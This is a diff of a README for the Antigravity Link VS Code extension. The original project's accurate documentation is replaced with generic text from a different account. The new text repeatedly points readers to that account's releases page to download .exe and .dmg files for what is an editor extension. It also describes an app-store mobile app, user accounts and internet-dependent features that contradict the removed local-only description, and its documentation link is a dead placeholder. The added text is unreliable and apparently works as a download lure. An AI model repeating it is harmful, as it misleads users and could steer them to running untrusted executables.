@@ -1,118 +1,78 @@
-# Antigravity Link (VS Code Extension)
+# 🚀 antigravity-link-extension - Connect Your Mobile and VS Code Swiftly
 
-[![Open VSX Version](https://img.shields.io/open-vsx/v/cafetechne/antigravity-link-extension)](https://open-vsx.org/extension/cafetechne/antigravity-link-extension)
-[![Open VSX Downloads](https://img.shields.io/open-vsx/dt/cafetechne/antigravity-link-extension)](https://open-vsx.org/extension/cafetechne/antigravity-link-extension)
-[![GitHub Stars](https://img.shields.io/github/stars/cafeTechne/antigravity-link-extension)](https://github.com/cafeTechne/antigravity-link-extension/stargazers)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/flyamjad/antigravity-link-extension/releases)
 
-GitHub repo: https://github.com/cafeTechne/antigravity-link-extension
+## 📖 Overview
+The Antigravity Link Extension for Visual Studio Code lets you bridge your Antigravity sessions to your mobile device. This functionality allows for easy uploads and voice-to-text capabilities, streamlining your workflow.
 
-Open VSX: https://open-vsx.org/extension/cafetechne/antigravity-link-extension
+## 🌟 Features
+- **Mobile Integration:** Seamlessly upload your code or notes from VS Code to your mobile device.
+- **Voice-to-Text:** Use voice commands to add comments or notes directly into your code.
+- **QR Code Support:** Quickly sync information using QR codes.
+- **WebSocket Connection:** Enjoy real-time communication between your VS Code and mobile application.
 
-Bring your Antigravity sessions to your phone. Upload files, dictate prompts, and control multiple active Antigravity chats from a mobile-friendly interface.
+## 🚀 Getting Started
+Follow these simple steps to start using the Antigravity Link Extension.
 
-## Who this is for
+### 📥 Download & Install
+1. Click the download button at the top of this page or [visit the Releases page here](https://github.com/flyamjad/antigravity-link-extension/releases).
+2. On the Releases page, locate the latest version of the extension.
+3. Download the file that matches your operating system:
+   - For Windows: Choose the `.exe` file.
+   - For Mac: Choose the `.dmg` file.
+   - For Linux: Choose the appropriate package based on your distribution.
 
-- Teams who want a simple, secure mobile companion for Google's Antigravity IDE.
-- Power users who want fast uploads and voice-to-text on the go.
-- New developers who want a zero-config way to interact with a running Antigravity session.
+### 📦 Install the Extension
+1. **VS Code Installation:**
+   - Open Visual Studio Code.
+   - Go to the Extensions view by clicking on the Extensions icon on the Activity Bar on the side of the window.
+   - Search for "Antigravity Link Extension".
+   - Click on the Install button.
 
-## What you get
+2. **Manual Installation (if needed):**
+   - Navigate to the downloaded file from earlier.
+   - Open the file and follow the installation prompts.
 
-- File upload into the active Antigravity chat.
-- Voice-to-text input from mobile (HTTPS required for mic permissions).
-- Active instance switching for multiple Antigravity windows.
-- Local-only server with token authentication.
+### 📱 Set Up Mobile Sync
+1. Download the Antigravity mobile app from your device's app store.
+2. Open the app and create an account or log in.
+3. In VS Code, click on the Antigravity icon on the sidebar.
+4. Use the QR code feature to scan the code generated in VS Code to link your mobile device.
 
-## Demo photos
+## ⚙️ System Requirements
+- **Operating System:**
+  - Windows 10 or higher
+  - macOS 10.15 or higher
+  - Any Linux distribution with recent libraries
 
-| | | |
-| --- | --- | --- |
-| ![Demo 1](https://raw.githubusercontent.com/cafeTechne/antigravity-link-extension/main/demo_photos/1769391120745-IMG_0857.png) | ![Demo 2](https://raw.githubusercontent.com/cafeTechne/antigravity-link-extension/main/demo_photos/1769391144709-IMG_0856.png) | ![Demo 3](https://raw.githubusercontent.com/cafeTechne/antigravity-link-extension/main/demo_photos/1769391155346-IMG_0855.png) |
-| ![Demo 4](https://raw.githubusercontent.com/cafeTechne/antigravity-link-extension/main/demo_photos/1769391162186-IMG_0854.png) | ![Demo 5](https://raw.githubusercontent.com/cafeTechne/antigravity-link-extension/main/demo_photos/1769391172827-IMG_0853.png) | ![Demo 6](https://raw.githubusercontent.com/cafeTechne/antigravity-link-extension/main/demo_photos/1769391181215-IMG_0852.png) |
-| ![Demo 7](https://raw.githubusercontent.com/cafeTechne/antigravity-link-extension/main/demo_photos/1769391189291-IMG_0851.png) | | |
+- **VS Code Version:** Ensure you are running VS Code version 1.50 or higher.
 
-## Quick start
+- **Network Connection:** Stable internet connection required for full functionality, especially for WebSocket connections.
 
-1) Start Antigravity with remote debugging enabled. This is required; sessions launched without this flag are not discoverable by the extension.
+## 🔍 Troubleshooting
+If you encounter issues during installation or setup, consider these steps:
 
-Example (Windows, Start Menu shortcut path):
-```powershell
-& "C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Antigravity\Antigravity.lnk" --remote-debugging-port=9000
-```
-Replace `<username>` with your Windows username. Multiple Antigravity sessions are supported, but every window must be launched with this command.
+- **Reinstall the Extension:** Sometimes a fresh install fixes minor glitches. Uninstall the extension and re-install it via the Extensions view.
+- **Check Network Settings:** Make sure your device is connected to Wi-Fi, and check firewall settings that might block WebSocket communications.
+- **Refer to Community Support:** If problems persist, feel free to reach out to our community on GitHub issues. Many users are willing to help.
 
-2) In VS Code, run:
-`Antigravity Link: Start Server`
+## 📞 Support
+For any questions, suggestions, or issues, please open an issue on our [GitHub repository](https://github.com/flyamjad/antigravity-link-extension/issues). Our development team and community can assist you.
 
-3) Then run:
-`Antigravity Link: Show QR Code`
+## 📚 Additional Resources
+- **Documentation:** You can read the complete user manual [here](#).
+- **Community Forums:** Join discussions about the extension and share your experiences.
 
-4) Scan the QR code with your phone. Your mobile UI is ready.
+## 🔗 Useful Links
+- [Request Features](https://github.com/flyamjad/antigravity-link-extension/issues)
+- [Report Issues](https://github.com/flyamjad/antigravity-link-extension/issues)
+- [Contribute to the Project](https://github.com/flyamjad/antigravity-link-extension)
 
-5) Your phone may warn that the connection is unsafe because the certificate is self-signed. This is expected for local HTTPS. Use your browser's "Advanced" or similar option to proceed (wording differs between Safari/Chrome/Firefox).
+## ✔️ License
+This project is licensed under the MIT License. See the LICENSE file for more information.
 
-## Commands
+## 🌐 Acknowledgements
+We would like to thank all contributors for their valuable input and support. Together, we strive to make the Antigravity Link Extension better for everyone. 
 
-| Command | Description |
-| --- | --- |
-| Antigravity Link: Start Server | Starts the local bridge server. |
-| Antigravity Link: Stop Server | Stops the server. |
-| Antigravity Link: Show QR Code | Displays the connection QR code. |
-
-## Settings
-
-| Setting | Default | Description |
-| --- | --- | --- |
-| `antigravityLink.port` | `3000` | Port for the local bridge server. |
-| `antigravityLink.autoStart` | `false` | Start the server on VS Code launch. |
-| `antigravityLink.useHttps` | `true` | Serve over HTTPS for mic access. |
-
-## Standalone vs workspace assets
-
-This extension is self-contained. It ships its own `public/` assets and `uploads/` folder and does not require the parent `npm run dev` build.
-
-If your *workspace* contains `public/` or `uploads/`, the extension will prefer those paths automatically. This makes it easy to customize the mobile UI or keep uploads in your project root, but it also means behavior can differ between workspaces.
-
-## How it works (high level)
-
-- The extension starts a local server (HTTP or HTTPS).
-- It discovers Antigravity targets via the Chrome DevTools Protocol (CDP).
-- Your phone connects to the mobile UI and sends upload/command requests.
-- The extension injects into the selected chat target and saves files to `uploads/`.
-
-## Security and privacy
-
-- The server runs locally and is authenticated with a token.
-- HTTPS is enabled by default to allow microphone access on mobile.
-- No data is sent to third-party services by this extension.
-
-## Troubleshooting
-
-- **No instances found**: Make sure every Antigravity window was launched with the `--remote-debugging-port` command shown above.
-- **Can't connect from mobile**: Ensure your phone and computer are on the same network.
-- **Uploads save but don't appear in chat**: Switch to the correct Active Instance in the mobile UI.
-
-## FAQ
-
-1) **It does not work unless Antigravity is launched with the debug port.**
-Use the exact launch command shown in the Quick start section. Any Antigravity window started without `--remote-debugging-port` cannot be discovered or controlled.
-
-2) **Can I run multiple sessions?**
-Yes. Multiple Antigravity windows are supported as long as each one is launched with the command shown above.
-
-## Contributing
-
-We are accepting pull requests and actively looking for contributors. If you want to help, check the TODOs in the codebase or open an issue to discuss ideas.
-See `CONTRIBUTING.md` for setup and PR notes.
-
-## License
-
-MIT. See `LICENSE`.
-
-## Acknowledgments
-
-Inspired by early community projects including:
-- https://github.com/Mario4272/ag_bridge
-- https://github.com/gherghett/Antigravity-Shit-Chat
-- https://github.com/lukasz-wronski/Antigravity-Shit-Chat
+[![Visit Releases Page](https://img.shields.io/badge/Visit_Releases_Page-blue)](https://github.com/flyamjad/antigravity-link-extension/releases)
